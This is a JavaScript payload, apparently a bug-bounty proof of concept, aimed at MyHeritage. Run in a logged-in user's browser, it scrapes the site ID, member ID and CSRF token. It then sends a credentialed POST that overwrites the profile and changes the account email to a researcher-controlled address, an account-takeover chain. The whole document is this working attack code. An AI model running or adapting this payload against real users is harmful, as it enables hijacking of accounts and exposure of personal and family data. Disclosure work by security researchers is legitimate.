// MyHeritage Profile Auto-Editor
(async () => {
    console.log('[AutoEdit] Starting profile auto-edit...');

    let siteID = null;
    let memberID = null;

    // Step 1: Extract site ID from current page
    const urlParams = new URLSearchParams(window.location.search);
    siteID = urlParams.get('s');

    if (!siteID) {
        // Try to extract from pathname
        const pathMatch = window.location.pathname.match(/\/family-sites\/[^\/]+\/([A-Z0-9]+)/);
        if (pathMatch) {
            siteID = pathMatch[1];
        }
    }

    // If still no siteID, fetch home page to get it
    if (!siteID) {
        console.log('[AutoEdit] No site ID found. Fetching home page...');
        try {
            const homeResponse = await fetch('https://www.myheritage.com/');
            const homeURL = homeResponse.url; // Get the redirected URL
            const homeMatch = homeURL.match(/\/family-sites\/[^\/]+\/([A-Z0-9]+)/);
            if (homeMatch) {
                siteID = homeMatch[1];
                console.log('[AutoEdit] Site ID from home redirect:', siteID);
            }
        } catch (error) {
            console.error('[AutoEdit] Error fetching home page:', error);
            return;
        }
    }

    if (!siteID) {
        console.error('[AutoEdit] Could not find site ID');
        return;
    }
    console.log('[AutoEdit] Site ID:', siteID);

    // Step 2: Extract memberID from current page or fetch profile page
    if (typeof currentUserAccountID !== 'undefined') {
        memberID = currentUserAccountID;
    } else {
        const bodyText = document.documentElement.innerHTML;
        const memberIDMatch = bodyText.match(/var currentUserAccountID\s*=\s*["']([A-Z0-9]+)["']/);
        if (memberIDMatch) {
            memberID = memberIDMatch[1];
        }
    }

    // If no memberID, fetch the profile page to get it
    if (!memberID) {
        console.log('[AutoEdit] Fetching profile page to get member ID...');
        try {
            const profileResponse = await fetch(`https://www.myheritage.com/family-sites/home?s=${siteID}`);
            const profileHTML = await profileResponse.text();
            const memberIDMatch = profileHTML.match(/var currentUserAccountID\s*=\s*["']([A-Z0-9]+)["']/);
            if (memberIDMatch) {
                memberID = memberIDMatch[1];
            }
        } catch (error) {
            console.error('[AutoEdit] Error fetching profile page:', error);
            return;
        }
    }

    if (!memberID) {
        console.error('[AutoEdit] Could not find member ID');
        return;
    }
    console.log('[AutoEdit] Member ID:', memberID);

    // Step 3: Fetch the edit profile page to get CSRF token
    const editProfileURL = `https://www.myheritage.com/FP/memberEditProfile.php?s=${siteID}&memberID=${memberID}`;
    console.log('[AutoEdit] Fetching edit profile page for CSRF token...');
    
    let csrfToken = null;
    try {
        const response = await fetch(editProfileURL);
        const html = await response.text();
        
        // Try multiple patterns for CSRF token
        const csrfPatterns = [
            /csrf_token=([a-zA-Z0-9._-]+)/,
            /name="csrf_token"\s+value="([^"]+)"/,
            /'csrf_token'\s*:\s*'([^']+)'/,
            /"csrf_token"\s*:\s*"([^"]+)"/
        ];

        for (const pattern of csrfPatterns) {
            const match = html.match(pattern);
            if (match) {
                csrfToken = match[1];
                break;
            }
        }
    } catch (error) {
        console.error('[AutoEdit] Error fetching edit profile page:', error);
        return;
    }

    if (!csrfToken) {
        console.error('[AutoEdit] Could not find CSRF token');
        return;
    }
    console.log('[AutoEdit] CSRF Token:', csrfToken);

    // Step 4: Prepare the POST data
    const formData = new URLSearchParams({
        memberID: memberID,
        isPostBack: '1',
        origin: 'member',
        s: siteID,
        gender: 'M',
        firstName: 'Testing',
        lastName: 'JS',
        month: '00',
        day: '0',
        year: '1950',
        country: 'MA',
        state: '',
        province: '',
        zipCode: '',
        preferredLang: 'EN',
        interests: 'naysser+hacked@bugcrowdninja.com',
        oldPassword: '',
        newPassword: '',
        confirmNewPassword: '',
        isChangePasswordOpen: '0',
        email: 'naysser+1@bugcrowdninja.com',
        currentPassword: '',
        isChangeEmailOpen: '0',
        deleteAccountConfirmationPassword: '',
        csrf_token: csrfToken
    });

    // Step 5: Submit the POST request
    console.log('[AutoEdit] Submitting profile changes...');
    console.log('[AutoEdit] POST URL:', `${editProfileURL}&sourceList=`);
    console.log('[AutoEdit] Form data:', formData.toString());
    
    try {
        const postResponse = await fetch(`${editProfileURL}&sourceList=`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://www.myheritage.com',
                'Referer': editProfileURL
            },
            body: formData.toString(),
            credentials: 'include',
            redirect: 'follow'
        });

        console.log('[AutoEdit] Response status:', postResponse.status);
        const responseText = await postResponse.text();
        console.log('[AutoEdit] Response preview:', responseText.substring(0, 500));

        if (postResponse.ok || postResponse.status === 302 || postResponse.status === 303) {
            console.log('[AutoEdit] Profile updated successfully!');
            alert('Profile has been automatically updated! Check your profile to see the changes.');
        } else {
            console.error('[AutoEdit] Failed to update profile. Status:', postResponse.status);
            console.error('[AutoEdit] Response:', responseText.substring(0, 1000));
        }
    } catch (error) {
        console.error('[AutoEdit] Error submitting profile changes:', error);
    }
})();
